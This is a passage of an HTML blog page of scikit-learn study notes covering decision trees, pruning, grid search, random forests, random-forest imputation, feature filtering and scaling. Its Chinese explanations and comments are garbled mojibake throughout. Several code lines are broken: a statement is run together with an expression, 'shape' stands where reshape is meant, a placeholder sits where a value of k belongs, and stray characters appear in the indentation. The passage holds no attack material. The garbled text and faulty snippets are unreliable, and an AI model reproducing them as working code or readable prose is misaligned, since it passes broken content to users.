class="string">&quot;random&quot;</span>)</span><br><span class="line"><span class="comment"># è®­ç»ƒ</span></span><br><span class="line">clf = clf.fit(Xtrain, Ytrain)</span><br><span class="line"><span class="comment"># è¯„ä»·ç»“æœ</span></span><br><span class="line">score = clf.score(Xtest, Ytest)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨graphvizç”»å‡ºå†³ç­–æ ‘</span></span><br><span class="line">dot_data = tree.export_graphviz(clf, feature_names=wine.feature_names, class_names=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>], filled=<span class="literal">True</span>, rounded=<span class="literal">True</span>, special_characters=<span class="literal">True</span>)</span><br><span class="line">graph = graphviz.Source(dot_data)</span><br><span class="line">graph</span><br><span class="line"><span class="comment"># ç¡®å®šæœ€ä¼˜å‰ªæå‚æ•°</span></span><br><span class="line">test = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    clf = tree.DecisionTreeClassifier(criterion=<span class="string">&#x27;entropy&#x27;</span>,random_state=<span class="number">30</span>,</span><br><span class="line">                                      splitter=<span class="string">&quot;random&quot;</span>,</span><br><span class="line">                                     max_depth=i+<span class="number">1</span>,</span><br><span class="line">                                     )</span><br><span class="line">    clf = clf.fit(Xtrain, Ytrain)</span><br><span class="line">    score = clf.score(Xtest, Ytest)</span><br><span class="line">    test.append(score)</span><br><span class="line"></span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>), test, color=<span class="string">&#x27;red&#x27;</span>, label=<span class="string">&#x27;max_depth&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"><span class="comment"># ç½‘æ ¼æœç´¢</span></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç½‘æ ¼æœç´¢ï¼Œèƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬åŒæ—¶è°ƒæ•´å¤šä¸ªå‚æ•°ï¼Œé‡‡ç”¨æšä¸¾æ³•</span></span><br><span class="line">gini_thresholds = np.linspace(<span class="number">0</span>,<span class="number">0.5</span>,<span class="number">20</span>)</span><br><span class="line">entropy_thresholds = np.linspace(<span class="number">0</span>,<span class="number">1</span>,<span class="number">50</span>)</span><br><span class="line">parameters = &#123;</span><br><span class="line">    <span class="string">&quot;criterion&quot;</span>:(<span class="string">&#x27;gini&#x27;</span>,<span class="string">&#x27;entropy&#x27;</span>)</span><br><span class="line">    ,<span class="string">&quot;splitter&quot;</span>:(<span class="string">&#x27;best&#x27;</span>,<span class="string">&#x27;random&#x27;</span>)</span><br><span class="line">    ,<span class="string">&#x27;max_depth&#x27;</span>:[*<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line">    ,<span class="string">&#x27;min_samples_leaf&#x27;</span>:[*<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>,<span class="number">5</span>)]</span><br><span class="line">    ,<span class="string">&#x27;min_impurity_decrease&#x27;</span>:[*gini_thresholds]</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">clf = DecisionTreeClassifier(random_state=<span class="number">25</span>)</span><br><span class="line">GS = GridSearchCV(clf,parameters,cv=<span class="number">10</span>)</span><br><span class="line">GS.fit(Xtrain,Ytrain)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>ç‰¹å¾é‡è¦æ€§</li></ul><p><code>clf.feature_importances_</code></p><p><code>[*zip(feature_name,clf.feature_importances_)]</code></p><ul><li>Criterionè¿™ä¸ªå‚æ•°æ­£æ˜¯ç”¨æ¥å†³å®šä¸çº¯åº¦çš„è®¡ç®—æ–¹æ³•çš„ã€‚sklearnæä¾›äº†ä¸¤ç§é€‰æ‹©ï¼š</li></ul><p>1ï¼‰è¾“å…¥â€entropyâ€œï¼Œä½¿ç”¨<strong>ä¿¡æ¯ç†µ</strong>ï¼ˆEntropyï¼‰ </p><p>2ï¼‰è¾“å…¥â€giniâ€œï¼Œä½¿ç”¨<strong>åŸºå°¼ç³»æ•°</strong>ï¼ˆGini Impurityï¼‰</p><blockquote><p>é€šå¸¸å°±ä½¿ç”¨åŸºå°¼ç³»æ•°</p><p>æ•°æ®ç»´åº¦å¾ˆå¤§ï¼Œå™ªéŸ³å¾ˆå¤§æ—¶ä½¿ç”¨åŸºå°¼ç³»æ•°</p><p>ç»´åº¦ä½ï¼Œæ•°æ®æ¯”è¾ƒæ¸…æ™°çš„æ—¶å€™ï¼Œä¿¡æ¯ç†µå’ŒåŸºå°¼ç³»æ•°æ²¡åŒºåˆ«</p><p>å½“å†³ç­–æ ‘çš„æ‹Ÿåˆç¨‹åº¦ä¸å¤Ÿçš„æ—¶å€™ï¼Œä½¿ç”¨ä¿¡æ¯ç†µ</p><p>ä¸¤ä¸ªéƒ½è¯•è¯•ï¼Œä¸å¥½å°±æ¢å¦å¤–ä¸€ä¸ª</p></blockquote><ul><li><strong>random_state &amp; splitter</strong></li></ul><p>  random_stateç”¨æ¥è®¾ç½®åˆ†æä¸­çš„éšæœºæ¨¡å¼çš„å‚æ•°ï¼Œé»˜è®¤Noneï¼Œåœ¨é«˜ç»´åº¦æ—¶éšæœºæ€§ä¼šè¡¨ç°æ›´æ˜æ˜¾ï¼Œä½ç»´åº¦çš„æ•°æ®ï¼ˆæ¯”å¦‚é¸¢å°¾èŠ±æ•°æ®é›†ï¼‰ï¼Œéšæœºæ€§å‡ ä¹ä¸ä¼šæ˜¾ç°ã€‚è¾“å…¥ä»»æ„æ•´æ•°ï¼Œä¼šä¸€ç›´é•¿å‡ºåŒä¸€æ£µæ ‘ï¼Œè®©æ¨¡å‹ç¨³å®šä¸‹æ¥ã€‚</p><p>  splitterä¹Ÿæ˜¯ç”¨æ¥æ§åˆ¶å†³ç­–æ ‘ä¸­çš„éšæœºé€‰é¡¹çš„ï¼Œæœ‰ä¸¤ç§è¾“å…¥å€¼ï¼Œè¾“å…¥â€bestâ€ï¼Œå†³ç­–æ ‘åœ¨åˆ†ææ—¶è™½ç„¶éšæœºï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šä¼˜å…ˆé€‰æ‹©æ›´é‡è¦çš„ç‰¹å¾è¿›è¡Œåˆ†æï¼ˆé‡è¦æ€§å¯ä»¥é€šè¿‡å±æ€§feature_importances_æŸ¥çœ‹ï¼‰ï¼Œè¾“å…¥â€œrandomâ€ï¼Œå†³ç­–æ ‘åœ¨åˆ†ææ—¶ä¼šæ›´åŠ éšæœºï¼Œæ ‘ä¼šå› ä¸ºå«æœ‰æ›´å¤šçš„ä¸å¿…è¦ä¿¡æ¯è€Œæ›´æ·±æ›´å¤§ï¼Œå¹¶å› è¿™äº›ä¸å¿…è¦ä¿¡æ¯è€Œé™ä½å¯¹è®­ç»ƒé›†çš„æ‹Ÿåˆã€‚è¿™ä¹Ÿæ˜¯é˜²æ­¢è¿‡æ‹Ÿåˆçš„ä¸€ç§æ–¹å¼ã€‚å½“ä½ é¢„æµ‹åˆ°ä½ çš„æ¨¡å‹ä¼šè¿‡æ‹Ÿåˆï¼Œç”¨è¿™ä¸¤ä¸ªå‚æ•°æ¥å¸®åŠ©ä½ é™ä½æ ‘å»ºæˆä¹‹åè¿‡æ‹Ÿåˆçš„å¯èƒ½æ€§ã€‚å½“ç„¶ï¼Œæ ‘ä¸€æ—¦å»ºæˆï¼Œæˆ‘ä»¬ä¾ç„¶æ˜¯ä½¿ç”¨å‰ªæå‚æ•°æ¥é˜²æ­¢è¿‡æ‹Ÿåˆ</p><h4><span id="å‰ªæç­–ç•¥">å‰ªæç­–ç•¥</span></h4><ul><li><strong>max_depth</strong></li></ul><p>â€‹  é™åˆ¶æ ‘çš„æœ€å¤§æ·±åº¦ï¼Œè¶…è¿‡è®¾å®šæ·±åº¦çš„æ ‘æå…¨éƒ¨å‰ªæ‰</p><ul><li><p><strong>min_samples_leaf &amp; min_samples_split</strong></p><p>min_samples_leafé™å®šï¼Œä¸€ä¸ªèŠ‚ç‚¹åœ¨åˆ†æåçš„æ¯ä¸ªå­èŠ‚ç‚¹éƒ½å¿…é¡»åŒ…å«è‡³å°‘min_samples_leafä¸ªè®­ç»ƒæ ·æœ¬ï¼Œå¦åˆ™åˆ†æå°±ä¸ä¼šå‘ç”Ÿï¼Œæˆ–è€…ï¼Œåˆ†æä¼šæœç€æ»¡è¶³æ¯ä¸ªå­èŠ‚ç‚¹éƒ½åŒ…å«min_samples_leafä¸ªæ ·æœ¬çš„æ–¹å‘å»å‘ç”Ÿã€‚ä¸€èˆ¬æ­é…max_depthä½¿ç”¨ï¼Œåœ¨å›å½’æ ‘ä¸­æœ‰ç¥å¥‡çš„æ•ˆæœï¼Œå¯ä»¥è®©æ¨¡å‹å˜å¾—æ›´åŠ å¹³æ»‘ã€‚è¿™ä¸ªå‚æ•°çš„æ•°é‡è®¾ç½®å¾—å¤ªå°ä¼šå¼•èµ·è¿‡æ‹Ÿåˆï¼Œè®¾ç½®å¾—å¤ªå¤§å°±ä¼šé˜»æ­¢æ¨¡å‹å­¦ä¹ æ•°æ®ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå»ºè®®ä»&#x3D;5å¼€å§‹ä½¿ç”¨ã€‚å¦‚æœå¶èŠ‚ç‚¹ä¸­å«æœ‰çš„æ ·æœ¬é‡å˜åŒ–å¾ˆå¤§ï¼Œå»ºè®®è¾“å…¥æµ®ç‚¹æ•°ä½œä¸ºæ ·æœ¬é‡çš„ç™¾åˆ†æ¯”æ¥ä½¿ç”¨ã€‚åŒæ—¶ï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥ä¿è¯æ¯ä¸ªå¶å­çš„æœ€å°å°ºå¯¸ï¼Œå¯ä»¥åœ¨å›å½’é—®é¢˜ä¸­é¿å…ä½æ–¹å·®ï¼Œè¿‡æ‹Ÿåˆçš„å¶å­èŠ‚ç‚¹å‡ºç°ã€‚å¯¹äºç±»åˆ«ä¸å¤šçš„åˆ†ç±»é—®é¢˜ï¼Œ&#x3D;1é€šå¸¸å°±æ˜¯æœ€ä½³é€‰æ‹©ã€‚</p><p>min_samples_splité™å®šï¼Œä¸€ä¸ªèŠ‚ç‚¹å¿…é¡»è¦åŒ…å«è‡³å°‘min_samples_splitä¸ªè®­ç»ƒæ ·æœ¬ï¼Œè¿™ä¸ªèŠ‚ç‚¹æ‰å…è®¸è¢«åˆ†æï¼Œå¦åˆ™åˆ†æå°±ä¸ä¼šå‘ç”Ÿã€‚</p></li></ul><h3><span id="å›å½’æ ‘">å›å½’æ ‘</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeRegressor</span><br><span class="line">regr_1 = DecisionTreeRegressor(max_depth=<span class="number">2</span>)</span><br><span class="line">regr_1.fit(X, y)</span><br><span class="line">y_1 = regr_1.predict(X_test)</span><br></pre></td></tr></table></figure><h3><span id="éšæœºæ£®æ—">éšæœºæ£®æ—</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line">wine = load_wine()</span><br><span class="line">wine.data</span><br><span class="line">wine.target</span><br><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(wine.data,wine.target,test_size=<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#clf = DecisionTreeClassifier(random_state=0)</span></span><br><span class="line">rfc = RandomForestClassifier(random_state=<span class="number">0</span>)</span><br><span class="line"><span class="comment">#clf = clf.fit(Xtrain,Ytrain)</span></span><br><span class="line">rfc = rfc.fit(Xtrain,Ytrain)</span><br><span class="line"><span class="comment">#score_c = clf.score(Xtest,Ytest)</span></span><br><span class="line">score_r = rfc.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#äº¤å‰éªŒè¯ï¼šæ˜¯æ•°æ®é›†åˆ’åˆ†ä¸ºnåˆ†ï¼Œä¾æ¬¡å–æ¯ä¸€ä»½åšæµ‹è¯•é›†ï¼Œæ¯n-1ä»½åšè®­ç»ƒé›†ï¼Œå¤šæ¬¡è®­ç»ƒæ¨¡å‹ä»¥è§‚æµ‹æ¨¡å‹ç¨³å®šæ€§çš„æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">rfc_l = []</span><br><span class="line">clf_l = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    rfc = RandomForestClassifier(n_estimators=<span class="number">25</span>)</span><br><span class="line">    rfc_s = cross_val_score(rfc,wine.data,wine.target,cv=<span class="number">10</span>).mean()</span><br><span class="line">    rfc_l.append(rfc_s)</span><br><span class="line">    clf = DecisionTreeClassifier()</span><br><span class="line">    clf_s = cross_val_score(clf,wine.data,wine.target,cv=<span class="number">10</span>).mean()</span><br><span class="line">    clf_l.append(clf_s)</span><br><span class="line">    </span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>),rfc_l,label = <span class="string">&quot;Random Forest&quot;</span>)</span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>),clf_l,label = <span class="string">&quot;Decision Tree&quot;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ˜¯å¦æœ‰æ³¨æ„åˆ°ï¼Œå•ä¸ªå†³ç­–æ ‘çš„æ³¢åŠ¨è½¨è¿¹å’Œéšæœºæ£®æ—ä¸€è‡´ï¼Ÿ</span></span><br><span class="line"><span class="comment">#å†æ¬¡éªŒè¯äº†æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ï¼Œå•ä¸ªå†³ç­–æ ‘çš„å‡†ç¡®ç‡è¶Šé«˜ï¼Œéšæœºæ£®æ—çš„å‡†ç¡®ç‡ä¹Ÿä¼šè¶Šé«˜</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>éšæœºæ£®æ—å¡«å……æ•°æ®</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">X_missing_reg = X_missing.copy()</span><br><span class="line">sortindex = np.argsort(X_missing_reg.isnull().<span class="built_in">sum</span>(axis=<span class="number">0</span>)).values</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sortindex:</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#æ„å»ºæˆ‘ä»¬çš„æ–°ç‰¹å¾çŸ©é˜µå’Œæ–°æ ‡ç­¾</span></span><br><span class="line"> Â  Â df = X_missing_reg</span><br><span class="line"> Â  Â fillc = df.iloc[:,i]</span><br><span class="line"> Â  Â df = pd.concat([df.iloc[:,df.columns != i],pd.DataFrame(y_full)],axis=<span class="number">1</span>)</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#åœ¨æ–°ç‰¹å¾çŸ©é˜µä¸­ï¼Œå¯¹å«æœ‰ç¼ºå¤±å€¼çš„åˆ—ï¼Œè¿›è¡Œ0çš„å¡«è¡¥</span></span><br><span class="line"> Â  Â df_0 =SimpleImputer(missing_values=np.nan,</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â strategy=<span class="string">&#x27;constant&#x27;</span>,fill_value=<span class="number">0</span>).fit_transform(df)</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#æ‰¾å‡ºæˆ‘ä»¬çš„è®­ç»ƒé›†å’Œæµ‹è¯•é›†</span></span><br><span class="line"> Â  Â Ytrain = fillc[fillc.notnull()]</span><br><span class="line"> Â  Â Ytest = fillc[fillc.isnull()]</span><br><span class="line"> Â  Â Xtrain = df_0[Ytrain.index,:]</span><br><span class="line"> Â  Â Xtest = df_0[Ytest.index,:]</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#ç”¨éšæœºæ£®æ—å›å½’æ¥å¡«è¡¥ç¼ºå¤±å€¼</span></span><br><span class="line"> Â  Â rfc = RandomForestRegressor(n_estimators=<span class="number">100</span>)</span><br><span class="line"> Â  Â rfc = rfc.fit(Xtrain, Ytrain)</span><br><span class="line"> Â  Â Ypredict = rfc.predict(Xtest)</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#å°†å¡«è¡¥å¥½çš„ç‰¹å¾è¿”å›åˆ°æˆ‘ä»¬çš„åŸå§‹çš„ç‰¹å¾çŸ©é˜µä¸­</span></span><br><span class="line">    X_missing_reg.loc[X_missing_reg.iloc[:,i].isnull(),X_missing_reg.columns[i]] = Ypredict</span><br><span class="line"> Â  Â <span class="comment"># X_missing_reg.loc[X_missing_reg.iloc[:,i].isnull(),i] = Ypredict å¯èƒ½æŠ¥é”™</span></span><br></pre></td></tr></table></figure><h3><span id="é¢„å¤„ç†">é¢„å¤„ç†</span></h3><h4><span id="æ–¹å·®è¿‡æ»¤"><strong>æ–¹å·®è¿‡æ»¤</strong></span></h4><p>æ¯”å¦‚ä¸€ä¸ªç‰¹å¾æœ¬èº«çš„æ–¹å·®å¾ˆå°ï¼Œå°±è¡¨ç¤ºæ ·æœ¬åœ¨è¿™ä¸ªç‰¹å¾ä¸ŠåŸºæœ¬æ²¡æœ‰å·®å¼‚ï¼Œå¯èƒ½ç‰¹å¾ä¸­çš„å¤§å¤šæ•°å€¼éƒ½ä¸€æ ·ï¼Œç”šè‡³æ•´ä¸ªç‰¹å¾çš„å–å€¼éƒ½ç›¸åŒï¼Œé‚£è¿™ä¸ªç‰¹å¾å¯¹äºæ ·æœ¬åŒºåˆ†æ²¡æœ‰ä»€ä¹ˆä½œç”¨<strong>æ‰€ä»¥æ— è®ºæ¥ä¸‹æ¥çš„ç‰¹å¾å·¥ç¨‹è¦åšä»€ä¹ˆï¼Œéƒ½è¦ä¼˜å…ˆæ¶ˆé™¤æ–¹å·®ä¸º0çš„ç‰¹å¾</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> VarianceThreshold</span><br><span class="line">selector = VarianceThreshold() <span class="comment">#å®ä¾‹åŒ–ï¼Œä¸å¡«å‚æ•°é»˜è®¤æ–¹å·®ä¸º0</span></span><br><span class="line">X_var0 = selector.fit_transform(X) <span class="comment">#è·å–åˆ é™¤ä¸åˆæ ¼ç‰¹å¾ä¹‹åçš„æ–°ç‰¹å¾çŸ©é˜µ</span></span><br><span class="line"><span class="comment"># è¿‡æ»¤ä¸€åŠçš„å˜é‡</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">X_fsvar = VarianceThreshold(np.median(X.var().values)).fit_transform(X) X.var().values</span><br><span class="line">np.median(X.var().values)</span><br></pre></td></tr></table></figure><h4><span id="å¡æ–¹è¿‡æ»¤">å¡æ–¹è¿‡æ»¤</span></h4><p>ä¸“é—¨é’ˆå¯¹ç¦»æ•£å‹æ ‡ç­¾ï¼ˆå³åˆ†ç±»é—®é¢˜ï¼‰çš„ç›¸å…³æ€§è¿‡æ»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier <span class="keyword">as</span> RFC</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> SelectKBest</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> chi2</span><br><span class="line"><span class="comment">#å‡è®¾åœ¨è¿™é‡Œæˆ‘ä¸€ç›´æˆ‘éœ€è¦300ä¸ªç‰¹å¾</span></span><br><span class="line">X_fschi = SelectKBest(chi2, k=<span class="number">300</span>).fit_transform(X_fsvar, y)</span><br><span class="line">X_fschi.shape</span><br><span class="line">cross_val_score(RFC(n_estimators=<span class="number">10</span>,random_state=<span class="number">0</span>),X_fschi,y,cv=<span class="number">5</span>).mean()</span><br><span class="line"></span><br><span class="line">chivalue, pvalues_chi = chi2(X_fsvar,y)</span><br><span class="line"><span class="comment">#kå–å¤šå°‘ï¼Ÿæˆ‘ä»¬æƒ³è¦æ¶ˆé™¤æ‰€æœ‰på€¼å¤§äºè®¾å®šå€¼ï¼Œæ¯”å¦‚0.05æˆ–0.01çš„ç‰¹å¾ï¼š</span></span><br><span class="line">k = chivalue.shape[<span class="number">0</span>] - (pvalues_chi &gt; <span class="number">0.05</span>).<span class="built_in">sum</span>()</span><br><span class="line">X_fschi = SelectKBest(chi2, k=å¡«å†™å…·ä½“çš„k).fit_transform(X_fsvar, y)</span><br><span class="line">cross_val_score(RFC(n_estimators=<span class="number">10</span>,random_state=<span class="number">0</span>),X_fschi,y,cv=<span class="number">5</span>).mean()</span><br></pre></td></tr></table></figure><h4><span id="fæ£€éªŒåªèƒ½æ£€éªŒçº¿æ€§å…³ç³»">Fæ£€éªŒï¼ˆåªèƒ½æ£€éªŒçº¿æ€§å…³ç³»ï¼‰</span></h4><p>å®ƒå³å¯ä»¥åšå›å½’ä¹Ÿå¯ä»¥åšåˆ†ç±»ï¼Œå› æ­¤åŒ…å«<strong>feature_selection.f_classif</strong>ï¼ˆFæ£€éªŒåˆ†ç±»ï¼‰å’Œ<strong>feature_selection.f_regression</strong>ï¼ˆFæ£€éªŒå›</p><p>å½’ï¼‰ä¸¤ä¸ªç±»ã€‚å…¶ä¸­Fæ£€éªŒåˆ†ç±»ç”¨äºæ ‡ç­¾æ˜¯ç¦»æ•£å‹å˜é‡çš„æ•°æ®ï¼Œè€ŒFæ£€éªŒå›å½’ç”¨äºæ ‡ç­¾æ˜¯è¿ç»­å‹å˜é‡çš„æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> f_classif</span><br><span class="line">F, pvalues_f = f_classif(X_fsvar,y) </span><br><span class="line">k = F.shape[<span class="number">0</span>] - (pvalues_f &gt; <span class="number">0.05</span>).<span class="built_in">sum</span>()</span><br><span class="line">X_fsF = SelectKBest(f_classif, k=å¡«å†™å…·ä½“çš„k).fit_transform(X_fsvar, y)</span><br><span class="line">cross_val_score(RFC(n_estimators=<span class="number">10</span>,random_state=<span class="number">0</span>),X_fsF,y,cv=<span class="number">5</span>).mean()</span><br></pre></td></tr></table></figure><h4><span id="äº’ä¿¡æ¯æ³•">äº’ä¿¡æ¯æ³•</span></h4><h3><span id="ç‰¹å¾å·¥ç¨‹">ç‰¹å¾å·¥ç¨‹</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Normalization å½’ä¸€åŒ– ä¸€èˆ¬æ¥è¯´å°†æ•°æ®åˆ†éƒ¨åœ¨0åˆ°1ä¹‹é—´</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line">data = [[-<span class="number">1</span>, <span class="number">2</span>], [-<span class="number">0.5</span>, <span class="number">6</span>], [<span class="number">0</span>, <span class="number">10</span>], [<span class="number">1</span>, <span class="number">18</span>]]</span><br><span class="line">scaler = MinMaxScaler()</span><br><span class="line"><span class="comment"># scaler = MinMaxScaler(feature_range=[5,10])</span></span><br><span class="line">result_ = scaler.fit_transform(data) <span class="comment">#è®­ç»ƒå’Œå¯¼å‡ºç»“æœä¸€æ­¥è¾¾æˆ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sklearn é‡Œé¢å¤„ç†æ ‡å‡†åŒ–è¿™äº›éœ€è¦äºŒç»´æ•°ç»„</span></span><br><span class="line"><span class="comment"># Standardization æ ‡å‡†åŒ– å°†æ•°æ®å¤„ç†æˆæ ‡å‡†æ­£æ€åˆ†å¸ƒå½¢å¼</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">data = [[-<span class="number">1</span>, <span class="number">2</span>], [-<span class="number">0.5</span>, <span class="number">6</span>], [<span class="number">0</span>, <span class="number">10</span>], [<span class="number">1</span>, <span class="number">18</span>]]</span><br><span class="line">scaler = StandardScaler() <span class="comment">#å®ä¾‹åŒ–</span></span><br><span class="line">res = scaler.fit_transform(data) <span class="comment">#ä½¿ç”¨fit_transform(data)ä¸€æ­¥è¾¾æˆç»“æœ</span></span><br><span class="line">res.mean()</span><br><span class="line">res.std()</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®é¢„å¤„ç†">æ•°æ®é¢„å¤„ç†</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sklearn é‡Œé¢å¤„ç†æ ‡å‡†åŒ–è¿™äº›éœ€è¦äºŒç»´æ•°ç»„</span></span><br><span class="line">shape(-<span class="number">1</span>,<span class="number">1</span>) <span class="comment"># å˜æˆä¸€åˆ—</span></span><br><span class="line">shape(<span class="number">1</span>,-<span class="number">1</span>) <span class="comment"># å˜æˆä¸€è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœæ•°æ®è‡ªå¸¦ç´¢å¼•ï¼Œå¯¼å…¥æ—¶éœ€æŒ‡å®šç´¢å¼•åˆ—</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">r&quot;C:\work\learnbetter\micro-class\week 3 Preprocessing\Narrativedata.csv&quot;</span>,index_col=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼ºå¤±æ•°æ®å¤„ç†</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span 